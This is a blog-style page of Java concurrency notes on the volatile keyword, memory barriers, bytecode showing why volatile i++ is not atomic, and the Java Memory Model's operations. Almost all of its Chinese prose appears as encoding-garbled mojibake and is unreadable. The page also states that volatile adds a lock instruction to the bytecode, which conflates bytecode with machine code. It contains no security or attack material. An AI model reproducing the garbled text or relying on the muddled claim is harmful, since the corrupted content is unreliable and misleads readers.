<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848702.png" alt="image-20210605202825290"></p>
<p><a href="https://www.cnblogs.com/yaowen/p/11240540.html">https://www.cnblogs.com/yaowen/p/11240540.html</a></p>
<p> å¯è§æ€§,ä¸ä¿è¯åŸå­æ€§,ç¦æ­¢æŒ‡ä»¤é‡æ’;</p>
<p>æŒ‡ä»¤é‡æ’: æºä»£ç - ç¼–è¯‘å™¨ä¼˜åŒ–é‡æ’-æŒ‡ä»¤å¹¶è¡Œä¹Ÿå¯èƒ½ä¼šé‡æ’-å†…å­˜ç³»ç»Ÿä¹Ÿä¼šé‡æ’-æ‰§è¡Œ; åœ¨DCLå•ä¾‹æ¨¡å¼ç”¨çš„å¤š;</p>
<p>volatileä½œç”¨ï¼š</p>
<p>1.é”æ€»çº¿ï¼Œå…¶å®ƒCPUå¯¹å†…å­˜çš„è¯»å†™è¯·æ±‚éƒ½ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°é”é‡Šæ”¾ï¼Œä¸è¿‡å®é™…åæ¥çš„å¤„ç†å™¨éƒ½é‡‡ç”¨é”ç¼“å­˜æ›¿ä»£é”æ€»çº¿ï¼Œå› ä¸ºé”æ€»çº¿çš„å¼€é”€æ¯”è¾ƒå¤§ï¼Œé”æ€»çº¿æœŸé—´å…¶ä»–CPUæ²¡æ³•è®¿é—®å†…å­˜</p>
<p>2.lockåçš„å†™æ“ä½œä¼šå›å†™å·²ä¿®æ”¹çš„æ•°æ®ï¼ŒåŒæ—¶è®©å…¶å®ƒCPUç›¸å…³ç¼“å­˜è¡Œå¤±æ•ˆï¼Œä»è€Œé‡æ–°ä»ä¸»å­˜ä¸­åŠ è½½æœ€æ–°çš„æ•°æ®</p>
<p>3.<strong>ä¸æ˜¯å†…å­˜å±éšœå´èƒ½å®Œæˆç±»ä¼¼å†…å­˜å±éšœçš„åŠŸèƒ½ï¼Œé˜»æ­¢å±éšœä¸¤éçš„æŒ‡ä»¤é‡æ’åº</strong></p>
<p>è¢«volatileä¿®é¥°çš„å˜é‡åœ¨ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶æ—¶ä¼šå¤šä¸ªlockæŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šç”Ÿæˆç›¸åº”çš„<strong>å†…å­˜å±éšœ</strong>ï¼Œä»¥æ­¤æ¥è§£å†³å¯è§æ€§è·Ÿé‡æ’åºçš„é—®é¢˜ã€‚</p>
<p>å†…å­˜å±éšœçš„ä½œç”¨ï¼š<br>1.åœ¨æœ‰å†…å­˜å±éšœçš„åœ°æ–¹ï¼Œä¼šç¦æ­¢æŒ‡ä»¤é‡æ’åºï¼Œå³å±éšœä¸‹é¢çš„ä»£ç ä¸èƒ½è·Ÿå±éšœä¸Šé¢çš„ä»£ç äº¤æ¢æ‰§è¡Œé¡ºåºã€‚<br>2.åœ¨æœ‰å†…å­˜å±éšœçš„åœ°æ–¹ï¼Œçº¿ç¨‹ä¿®æ”¹å®Œå…±äº«å˜é‡ä»¥åä¼šé©¬ä¸ŠæŠŠè¯¥å˜é‡ä»æœ¬åœ°å†…å­˜å†™å›åˆ°ä¸»å†…å­˜ï¼Œ<strong>å¹¶ä¸”è®©å…¶ä»–çº¿ç¨‹æœ¬åœ°å†…å­˜ä¸­è¯¥å˜é‡å‰¯æœ¬å¤±æ•ˆï¼ˆä½¿ç”¨MESIåè®®ï¼‰</strong></p>
<p>JSRå†…å­˜å±éšœå¯ä»¥è¢«åˆ†ä¸ºä»¥ä¸‹å‡ ç§ç±»å‹(JVMçš„è¦æ±‚, å…·ä½“hotpsotä½¿ç”¨lockæœºåˆ¶æ¥å®ç°)<br><strong>LoadLoadå±éšœï¼š</strong>å¯¹äºè¿™æ ·çš„è¯­å¥Load1; LoadLoad; Load2ï¼Œåœ¨Load2åŠåç»­è¯»å–æ“ä½œè¦è¯»å–çš„æ•°æ®è¢«è®¿é—®å‰ï¼Œä¿è¯Load1è¦è¯»å–çš„æ•°æ®è¢«è¯»å–å®Œæ¯•ã€‚<br><strong>StoreStoreå±éšœï¼š</strong>å¯¹äºè¿™æ ·çš„è¯­å¥Store1; StoreStore; Store2ï¼Œåœ¨Store2åŠåç»­å†™å…¥æ“ä½œæ‰§è¡Œå‰ï¼Œä¿è¯Store1çš„å†™å…¥æ“ä½œå¯¹å…¶å®ƒå¤„ç†å™¨å¯è§ã€‚<br><strong>LoadStoreå±éšœï¼š</strong>å¯¹äºè¿™æ ·çš„è¯­å¥Load1; LoadStore; Store2ï¼Œåœ¨Store2åŠåç»­å†™å…¥æ“ä½œè¢«åˆ·å‡ºå‰ï¼Œä¿è¯Load1è¦è¯»å–çš„æ•°æ®è¢«è¯»å–å®Œæ¯•ã€‚<br><strong>StoreLoadå±éšœï¼š</strong>å¯¹äºè¿™æ ·çš„è¯­å¥Store1; StoreLoad; Load2ï¼Œåœ¨Load2åŠåç»­æ‰€æœ‰è¯»å–æ“ä½œæ‰§è¡Œå‰ï¼Œä¿è¯Store1çš„å†™å…¥å¯¹æ‰€æœ‰å¤„ç†å™¨å¯è§ã€‚å®ƒçš„å¼€é”€æ˜¯å››ç§å±éšœä¸­æœ€å¤§çš„ã€‚     åœ¨å¤§å¤šæ•°å¤„ç†å™¨çš„å®ç°ä¸­ï¼Œè¿™ä¸ªå±éšœæ˜¯ä¸ªä¸‡èƒ½å±éšœï¼Œå…¼å…·å…¶å®ƒä¸‰ç§å†…å­˜å±éšœçš„åŠŸèƒ½ã€‚</p>
<p>ä¸ºäº†å®ç°volatileçš„å†…å­˜è¯­ä¹‰ï¼Œç¼–è¯‘å™¨åœ¨ç”Ÿæˆå­—èŠ‚ç æ—¶ï¼Œä¼šåœ¨æŒ‡ä»¤åºåˆ—ä¸­æ’å…¥å†…å­˜å±éšœæ¥ç¦æ­¢ç‰¹å®šç±»å‹çš„å¤„ç†å™¨é‡æ’åºã€‚å¯¹äºç¼–è¯‘å™¨æ¥è¯´ï¼Œå‘ç°ä¸€ä¸ªæœ€ä¼˜å¸ƒç½®æ¥æœ€å°åŒ–æ’å…¥å±éšœçš„æ€»æ•°å‡ ä¹ä¸å¯èƒ½ï¼Œä¸ºæ­¤ï¼ŒJMMé‡‡å–ä¿å®ˆç­–ç•¥ã€‚ä¸‹é¢æ˜¯åŸºäºä¿å®ˆç­–ç•¥çš„JMMå†…å­˜å±éšœæ’å…¥ç­–ç•¥ï¼š</p>
<ol>
<li>åœ¨æ¯ä¸ªvolatileå†™æ“ä½œçš„å‰é¢æ’å…¥ä¸€ä¸ªStoreStoreå±éšœã€‚</li>
<li>åœ¨æ¯ä¸ªvolatileå†™æ“ä½œçš„åé¢æ’å…¥ä¸€ä¸ªStoreLoadå±éšœã€‚</li>
<li>åœ¨æ¯ä¸ªvolatileè¯»æ“ä½œçš„åé¢æ’å…¥ä¸€ä¸ªLoadLoadå±éšœã€‚</li>
<li>åœ¨æ¯ä¸ªvolatileè¯»æ“ä½œçš„åé¢æ’å…¥ä¸€ä¸ªLoadStoreå±éšœã€‚</li>
</ol>
<p>ä¸Šè¿°å†…å­˜å±éšœæ’å…¥ç­–ç•¥éå¸¸ä¿å®ˆï¼Œä½†å®ƒå¯ä»¥ä¿è¯åœ¨ä»»æ„å¤„ç†å™¨å¹³å°ï¼Œä»»æ„çš„ç¨‹åºä¸­éƒ½èƒ½å¾—åˆ°æ­£ç¡®çš„volatileå†…å­˜è¯­ä¹‰ã€‚</p>
<p>volatileå…³é”®å­—ä¿®é¥°çš„å˜é‡ä¼šå­˜åœ¨ä¸€ä¸ªlock:çš„å‰ç¼€; </p>
<p>Lockå‰ç¼€,lockä¸æ˜¯ä¸€ç§å†…å­˜å±éšœ,ä½†æ˜¯å®ƒèƒ½å®Œæˆå†…å­˜å±éšœçš„åŠŸèƒ½. lockä¼šå¯¹CPUæ€»çº¿å’Œé«˜é€Ÿç¼“å­˜è¡ŒåŠ é”,å¯ä»¥ç†è§£ä¸ºCPUæŒ‡ä»¤çº§çš„é”. ç±»ä¼¼äºlockæŒ‡ä»¤. åœ¨å…·ä½“æ‰§è¡Œä¸Š, å®ƒå…ˆå¯¹æ€»çº¿å’Œç¼“å­˜åŠ é”,ç„¶åæ‰§è¡Œåé¢çš„æŒ‡ä»¤, åœ¨locké”ä½æ€»çº¿çš„æ—¶å€™,å…¶ä»–cpuè¯»å†™è¯·æ±‚éƒ½ä¼šè¢«é˜»å¡, ç›´åˆ°é”è¢«é‡Šæ”¾. æœ€åé‡Šæ”¾é”åä¼šæŠŠé«˜é€Ÿç¼“å­˜ä¸­çš„è„æ•°æ®å…¨éƒ¨åˆ·æ–°å›ä¸»å†…å­˜, ä¸”è¿™ä¸ªå†™å›å†…å­˜çš„æ“ä½œä¼šä½¿åœ¨å…¶ä»–cpué‡Œç¼“å­˜äº†è¯¥åœ°å€çš„æ•°æ®æ— æ•ˆ.</p>
<p>å½“çº¿ç¨‹bå‘ç°å¯¹åº”åœ°å€çš„ç¼“å­˜è¡Œè¢«é”äº†,ç­‰å¾…é”çš„é‡Šæ”¾, ç¼“å­˜ä¸€è‡´æ€§åè®®ä¼šä¿è¯å®ƒè¯»å–åˆ°æœ€æ–°çš„å€¼(é‡æ–°ä»ä¸»å­˜ä¸­è¯»å–, å› ä¸ºæœ‰æ€»çº¿é”,å¦‚æœçº¿ç¨‹aè¿˜æ²¡å†™å›,bæ— æ³•è¯»å–å†…å­˜çš„ä¸œè¥¿,æ€»çº¿è¢«é”ä½äº†) </p>
<p> volatileæ˜¯â€œè½»é‡çº§â€synchronizedï¼Œä¿è¯äº†å…±äº«å˜é‡çš„â€œå¯è§æ€§â€ï¼ˆJMMç¡®ä¿æ‰€æœ‰çº¿ç¨‹çœ‹åˆ°è¿™ä¸ªå˜é‡çš„å€¼æ˜¯ä¸€è‡´çš„ï¼‰ï¼Œå½“CPUå†™æ•°æ®æ—¶ï¼Œå¦‚æœå‘ç°æ“ä½œçš„å˜é‡æ˜¯å…±äº«å˜é‡ï¼Œå³åœ¨å…¶ä»–CPUä¸­ä¹Ÿå­˜åœ¨è¯¥å˜é‡çš„å‰¯æœ¬ï¼Œä¼šå‘å‡ºä¿¡å·é€šçŸ¥å…¶ä»–CPUå°†è¯¥å˜é‡çš„ç¼“å­˜è¡Œç½®ä¸ºæ— æ•ˆçŠ¶æ€å¹¶ä¸”é”ä½ç¼“å­˜è¡Œï¼Œå› æ­¤å½“å…¶ä»–CPUéœ€è¦è¯»å–è¿™ä¸ªå˜é‡æ—¶ï¼Œè¦ç­‰é”é‡Šæ”¾ï¼Œå¹¶å‘ç°è‡ªå·±ç¼“å­˜è¡Œæ˜¯æ— æ•ˆçš„ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šä»å†…å­˜é‡æ–°è¯»å–ã€‚</p>
<p> volatileæ˜¯â€œè½»é‡çº§â€synchronizedï¼Œä¿è¯äº†å…±äº«å˜é‡çš„â€œå¯è§æ€§â€ï¼ˆJMMç¡®ä¿æ‰€æœ‰çº¿ç¨‹çœ‹åˆ°è¿™ä¸ªå˜é‡çš„å€¼æ˜¯ä¸€è‡´çš„ï¼‰ï¼Œä½¿ç”¨å’Œæ‰§è¡Œæˆæœ¬æ¯”synchronizedä½ï¼Œå› ä¸ºå®ƒä¸ä¼šå¼•èµ·çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œè°ƒåº¦ã€‚</p>
<hr>
<p>å·¥ä½œå†…å­˜Work Memoryå…¶å®å°±æ˜¯å¯¹CPUå¯„å­˜å™¨å’Œé«˜é€Ÿç¼“å­˜çš„æŠ½è±¡ï¼Œæˆ–è€…è¯´æ¯ä¸ªçº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¹Ÿå¯ä»¥ç®€å•ç†è§£ä¸ºCPUå¯„å­˜å™¨å’Œé«˜é€Ÿç¼“å­˜ã€‚</p>
<h3 id="volatileæ— æ³•ä¿è¯å…±äº«å˜é‡i-çº¿ç¨‹å®‰å…¨åŸå› -JVMå­—èŠ‚ç å±‚é¢"><a href="#volatileæ— æ³•ä¿è¯å…±äº«å˜é‡i-çº¿ç¨‹å®‰å…¨åŸå› -JVMå­—èŠ‚ç å±‚é¢" class="headerlink" title="volatileæ— æ³•ä¿è¯å…±äº«å˜é‡i++çº¿ç¨‹å®‰å…¨åŸå› (JVMå­—èŠ‚ç å±‚é¢)"></a>volatileæ— æ³•ä¿è¯å…±äº«å˜é‡i++çº¿ç¨‹å®‰å…¨åŸå› (JVMå­—èŠ‚ç å±‚é¢)</h3><p>volatileæ˜¯ä¸ºäº†è§£å†³JMMå¸¦æ¥çš„å˜é‡å¯è§æ€§é—®é¢˜ã€‚</p>
<p>å¦‚æœå…±äº«å˜é‡i++ä¹Ÿå’Œå±€éƒ¨å˜é‡i++çš„æ‰§è¡Œæµç¨‹ç›¸åŒï¼šç›´æ¥å°†å±€éƒ¨å˜é‡ä¸­iå€¼è‡ªå¢åŠ 1ï¼Œé‚£ä¹ˆvolatileä¸å°±èƒ½ä¿è¯å¤šçº¿ç¨‹æ•°æ®å®‰å…¨äº†ï¼Ÿä¼—æ‰€å‘¨çŸ¥ï¼Œvolatileæ— æ³•ä¿è¯åŸå­æ€§ï¼Œå®ƒåªä¿è¯å¯è§æ€§ã€‚æ¥çœ‹çœ‹JVMçš„å…·ä½“å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//è¡Œæ•°2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        i++;<span class="comment">//è¡Œæ•°4</span></span><br><span class="line">    &#125;<span class="comment">//è¡Œæ•°5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Compiled from <span class="string">&quot;Demo.java&quot;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: getstatic     #<span class="number">2</span>   <span class="comment">// Field i:I    //è·å–é™æ€å…±äº«å˜é‡içš„å€¼æ”¾å…¥æ“ä½œæ•°æ ˆé¡¶</span></span><br><span class="line">       <span class="number">3</span>: iconst_1                           <span class="comment">//å°†æ•´æ•°1æ¨åˆ°æ ˆé¡¶</span></span><br><span class="line">       <span class="number">4</span>: iadd                               <span class="comment">//å°†æ ˆé¡¶ä¸¤intå€¼ç›¸åŠ å¹¶å°†ç»“æœå‹å…¥æ ˆé¡¶</span></span><br><span class="line">       <span class="number">5</span>: putstatic     #<span class="number">2</span>   <span class="comment">// Field i:I    //å°†æ ˆé¡¶çš„å€¼åŒæ­¥å›ä¸»å­˜</span></span><br><span class="line">       <span class="number">8</span>: <span class="keyword">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">4</span>: <span class="number">0</span>    <span class="comment">//å…±äº«å˜é‡i++ï¼ŒåŒ…å«äº†0ã€3ã€4ã€5çš„ä»£ç æ‰§è¡Œ</span></span><br><span class="line">      line <span class="number">5</span>: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;&#125;;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: iconst_0</span><br><span class="line">       <span class="number">1</span>: putstatic     #<span class="number">2</span>   <span class="comment">// Field i:I</span></span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">2</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ï¼šstaticå…±äº«å˜é‡i++ï¼šåˆ†3æ­¥ï¼Œä¸€.è·å–å˜é‡içš„å€¼ï¼ŒäºŒ.å€¼åŠ 1ï¼Œä¸‰.åŠ 1åçš„å€¼å†™å›iä¸­ã€‚ä¼ªä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">temp = temp + <span class="number">1</span>;</span><br><span class="line">i = temp;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾äº†ï¼ŒåŸå› å°±æ˜¯javaå…±äº«å˜é‡çš„è¿ç®—æ“ä½œç¬¦ä¸æ˜¯åŸå­æ“ä½œï¼ï¼ˆå­—èŠ‚ç å±‚é¢ã€‚å…¶å®ä¸å¤Ÿä¸¥è°¨ï¼Œå› ä¸ºå°±ç®—ç¼–è¯‘å‡ºæ¥åªæœ‰ä¸€æ¡å­—èŠ‚ç æŒ‡ä»¤ï¼ŒJVMè§£é‡Šå™¨ä¹Ÿä¼šè¿è¡Œå¤šè¡Œä»£ç è§£é‡Šæ‰§è¡Œæˆ–å³æ—¶ç¼–è¯‘å™¨ä¹Ÿä¼šç¼–è¯‘æˆå¤šè¡Œæœ¬åœ°æœºå™¨ç æ‰§è¡Œï¼Œä½¿ç”¨ -XX:+PrintAssembly å‚æ•°è¾“å‡ºåæ±‡ç¼–æ¥åˆ†æä¼šæ›´ä¸¥è°¨äº›ï¼Œä½†è¿™é‡Œå­—èŠ‚ç å±‚é¢å·²ç»è¶³ä»¥è¯´æ˜é—®é¢˜ï¼‰</p>
<p>å¤šçº¿ç¨‹ç¯å¢ƒï¼Œå‡è®¾Aã€Bçº¿ç¨‹åŒæ—¶æ‰§è¡Œï¼Œéƒ½æ‰§è¡Œåˆ°äº†ç¬¬äºŒæ­¥ï¼ŒBçº¿ç¨‹å…ˆæ‰§è¡Œç»“æŸi&#x3D;1ï¼Œå› ä¸ºå˜é‡iæ˜¯volatileç±»å‹ï¼Œæ‰€ä»¥Bçº¿ç¨‹æ‰§è¡Œç»“æŸé©¬ä¸Šåˆ·æ–°å·¥ä½œçº¿ç¨‹ä¸­i&#x3D;1åˆ°ä¸»å­˜ï¼Œå¹¶ä¸”é€šçŸ¥å…¶å®ƒcpuä¸­çº¿ç¨‹ï¼šä¸»å­˜ä¸­içš„å€¼æ›´æ–°äº†ï¼Œä½¿Aå·¥ä½œçº¿ç¨‹ä¸­ç¼“å­˜çš„iå¤±æ•ˆã€‚å¦‚æœAçº¿ç¨‹è¿™æ—¶å€™ä½¿ç”¨åˆ°å˜é‡iï¼Œå°±éœ€è¦å»ä¸»å­˜é‡æ–°copyä¸€ä»½å‰¯æœ¬åˆ°è‡ªå·±çš„å·¥ä½œå†…å­˜ã€‚ä½†æ˜¯è¿™æ—¶å€™Aæ‰§è¡Œåˆ°äº†temp &#x3D; temp + 1ï¼Œå·²ç»ç”¨ä¸´æ—¶å˜é‡tempè®°å½•äº†ä¹‹å‰içš„å€¼ï¼Œä¸éœ€è¦å†è¯»å–içš„å€¼äº†ã€‚æ‰€ä»¥ï¼Œè™½ç„¶å˜é‡içš„å€¼0åœ¨Açš„å·¥ä½œå†…å­˜ä¸­ç¡®å®å¤±æ•ˆäº†ï¼Œä½†æ˜¯å€¼tempä»ç„¶æ˜¯æœ‰æ•ˆçš„ï¼Œæ—¢ç„¶æœ‰æ•ˆï¼ŒAå°±ä¼šå°†ç¬¬ä¸‰æ­¥çš„ç»“æœi&#x3D;1å†æ¬¡å†™å…¥ä¸»å­˜ï¼Œè¦†ç›–äº†ä¹‹å‰Bçº¿ç¨‹å†™å…¥çš„å€¼ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆvolatileæ— æ³•ä¿è¯å…±äº«å˜é‡i++çº¿ç¨‹å®‰å…¨çš„åŸå› ã€‚ç®€å•è®²å°±æ˜¯volatileå…³é”®å­—åªä¿è¯äº† â€œ0: getstaticâ€ è·å–åˆ°çš„æ˜¯ä¸»å­˜ä¸­æœ€æ–°çš„å€¼ï¼Œä¸ä¿è¯ â€œ4: iaddâ€ æ‰§è¡Œæ—¶æ“ä½œæ ˆä¸­çš„å€¼æ˜¯ä¸»å­˜æœ€æ–°çš„ã€‚</p>
<p>å…¶å®ï¼Œè¿™äº›éƒ½æ˜¯JMM Javaå†…å­˜æ¨¡å‹å¸¦æ¥çš„æ•°æ®é—®é¢˜ï¼šå¯è§æ€§ã€æœ‰åºæ€§ã€åŸå­æ€§ã€‚volatileæ˜¯JDKæä¾›çš„è§£å†³JMMæ•°æ®å¯è§æ€§çš„å…³é”®å­—ï¼ˆvolatileè¿˜ä¿è¯äº†æœ‰åºæ€§ï¼‰ï¼ŒJVMå®ç°volatileå†…å­˜å¯è§æ€§è¯­ä¹‰ï¼Œä¸Šé¢åæ±‡ç¼–å¾—åˆ°çš„ä»£ç å°±æ˜¯JVMçš„å…·ä½“å®ç°æµç¨‹ã€‚</p>
<h3 id="JMM"><a href="#JMM" class="headerlink" title="JMM"></a>JMM</h3><p> javaå†…å­˜æ¨¡å‹ä¸»è¦å®šä¹‰äº†å„ç§å˜é‡çš„è®¿é—®è§„åˆ™;</p>
<p>Javaå†…å­˜æ¨¡å‹ï¼ˆJava Memory Model ,JMMï¼‰(æŒ‡JDK5çš„æ–°æ¨¡å‹)å°±æ˜¯ä¸€ç§ç¬¦åˆå†…å­˜æ¨¡å‹è§„èŒƒçš„ï¼Œå±è”½äº†å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„è®¿é—®å·®å¼‚çš„ï¼Œä¿è¯äº†Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸‹å¯¹å†…å­˜çš„è®¿é—®éƒ½èƒ½ä¿è¯æ•ˆæœä¸€è‡´çš„æœºåˆ¶åŠè§„èŒƒã€‚</p>
<p>Javaå†…å­˜æ¨¡å‹è§„å®šäº†æ‰€æœ‰çš„å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­ï¼Œæ¯æ¡çº¿ç¨‹è¿˜æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ï¼Œçº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¸­ä¿å­˜äº†è¯¥çº¿ç¨‹ä¸­æ˜¯ç”¨åˆ°çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬æ‹·è´ï¼Œçº¿ç¨‹å¯¹å˜é‡çš„æ‰€æœ‰æ“ä½œéƒ½å¿…é¡»åœ¨å·¥ä½œå†…å­˜ä¸­è¿›è¡Œï¼Œè€Œä¸èƒ½ç›´æ¥è¯»å†™ä¸»å†…å­˜ã€‚ä¸åŒçš„çº¿ç¨‹ä¹‹é—´ä¹Ÿæ— æ³•ç›´æ¥è®¿é—®å¯¹æ–¹å·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œçº¿ç¨‹é—´å˜é‡çš„ä¼ é€’å‡éœ€è¦è‡ªå·±çš„å·¥ä½œå†…å­˜å’Œä¸»å­˜ä¹‹é—´è¿›è¡Œæ•°æ®åŒæ­¥è¿›è¡Œã€‚è€ŒJMMå°±ä½œç”¨äºå·¥ä½œå†…å­˜å’Œä¸»å­˜ä¹‹é—´æ•°æ®åŒæ­¥è¿‡ç¨‹ã€‚ä»–è§„å®šäº†å¦‚ä½•åšæ•°æ®åŒæ­¥ä»¥åŠä»€ä¹ˆæ—¶å€™åšæ•°æ®åŒæ­¥ã€‚<strong>JMMæ˜¯ä¸€ç§è§„èŒƒï¼Œç›®çš„æ˜¯è§£å†³ç”±äºå¤šçº¿ç¨‹é€šè¿‡å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡æ—¶ï¼Œå­˜åœ¨çš„æœ¬åœ°å†…å­˜æ•°æ®ä¸ä¸€è‡´ã€ç¼–è¯‘å™¨ä¼šå¯¹ä»£ç æŒ‡ä»¤é‡æ’åºã€å¤„ç†å™¨ä¼šå¯¹ä»£ç ä¹±åºæ‰§è¡Œç­‰å¸¦æ¥çš„é—®é¢˜ã€‚</strong></p>
<p>åœ¨å¼€å‘å¤šçº¿ç¨‹çš„ä»£ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨synchronizedç­‰å…³é”®å­—æ¥æ§åˆ¶å¹¶å‘ï¼Œä»æ¥å°±ä¸éœ€è¦å…³å¿ƒåº•å±‚çš„ç¼–è¯‘å™¨ä¼˜åŒ–ã€ç¼“å­˜ä¸€è‡´æ€§ç­‰é—®é¢˜ã€‚æ‰€ä»¥ï¼ŒJavaå†…å­˜æ¨¡å‹ï¼Œé™¤äº†å®šä¹‰äº†ä¸€å¥—è§„èŒƒï¼Œè¿˜æä¾›äº†ä¸€ç³»åˆ—åŸè¯­ï¼Œå°è£…äº†åº•å±‚å®ç°åï¼Œä¾›å¼€å‘è€…ç›´æ¥ä½¿ç”¨ã€‚</p>
<p>Jdk1.2ä¹‹å‰,éƒ½æ˜¯ä»ä¸»å­˜ä¸­è¯»å–å˜é‡; è€Œåœ¨å½“å‰çš„ Java å†…å­˜æ¨¡å‹ä¸‹ï¼Œçº¿ç¨‹å¯ä»¥æŠŠå˜é‡ä¿å­˜<strong>æœ¬åœ°å†…å­˜</strong>ï¼ˆæ¯”å¦‚æœºå™¨çš„å¯„å­˜å™¨ï¼‰ä¸­ï¼Œè€Œä¸æ˜¯ç›´æ¥åœ¨ä¸»å­˜ä¸­è¿›è¡Œè¯»å†™ã€‚è¿™å°±å¯èƒ½é€ æˆä¸€ä¸ªçº¿ç¨‹åœ¨ä¸»å­˜ä¸­ä¿®æ”¹äº†ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œè€Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹è¿˜ç»§ç»­ä½¿ç”¨å®ƒåœ¨å¯„å­˜å™¨ä¸­çš„å˜é‡å€¼çš„æ‹·è´ï¼Œé€ æˆ<strong>æ•°æ®çš„ä¸ä¸€è‡´</strong>ã€‚</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848717.png" alt="JMM(Javaå†…å­˜æ¨¡å‹)" style="zoom:50%;" />

<p>volatileæŒ‡ç¤ºJVMè¿™ä¸ªå˜é‡æ˜¯å…±äº«ä¸”ä¸ç¨³å®šçš„,æ¯æ¬¡ä½¿ç”¨å®ƒéƒ½åˆ°ä¸»å­˜ä¸­å»è¯»å–; é˜²æ­¢æŒ‡ä»¤é‡æ’;ä¿è¯å˜é‡çš„å¯è§æ€§;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848004.png" alt="volatileå…³é”®å­—çš„å¯è§æ€§" style="zoom:50%;" />

<p>åŒæ­¥çº¦å®š: çº¿ç¨‹è§£é”å‰,å¿…é¡»æŠŠå…±äº«å˜é‡ç«‹åˆ»åˆ·å›ä¸»å­˜; çº¿ç¨‹åŠ é”å‰, å¿…é¡»è¯»å–ä¸»å­˜ä¸­çš„æœ€æ–°çš„å€¼åˆ°å·¥ä½œå†…å­˜ä¸­; åŠ é”å’Œè§£é”æ˜¯åŒä¸€æŠŠé”; </p>
<p>8ç§æ“ä½œ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848038.png" alt="image-20210427084129374"></p>
<p>8ç§æ“ä½œå¦‚ä¸‹ï¼š</p>
<ul>
<li>lock(é”å®š)ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œå®ƒæŠŠä¸€ä¸ªå˜é‡æ ‡è®°ä¸ºä¸€æ¡çº¿ç¨‹ç‹¬å çŠ¶æ€ï¼›</li>
<li>read(è¯»å–)ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œå®ƒæŠŠå˜é‡å€¼ä»ä¸»å†…å­˜ä¼ é€åˆ°çº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¸­ï¼Œä»¥ä¾¿éšåçš„loadåŠ¨ä½œä½¿ç”¨ï¼›</li>
<li>load(è½½å…¥)ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼Œå®ƒæŠŠreadæ“ä½œçš„å€¼æ”¾å…¥å·¥ä½œå†…å­˜ä¸­çš„å˜é‡å‰¯æœ¬ä¸­ï¼›</li>
<li>use(ä½¿ç”¨)ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼Œå®ƒæŠŠå·¥ä½œå†…å­˜ä¸­çš„å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“ï¼Œæ¯å½“è™šæ‹Ÿæœºé‡åˆ°ä¸€ä¸ªéœ€è¦ä½¿ç”¨è¿™ä¸ªå˜é‡çš„æŒ‡ä»¤æ—¶å€™ï¼Œå°†ä¼šæ‰§è¡Œè¿™ä¸ªåŠ¨ä½œï¼›</li>
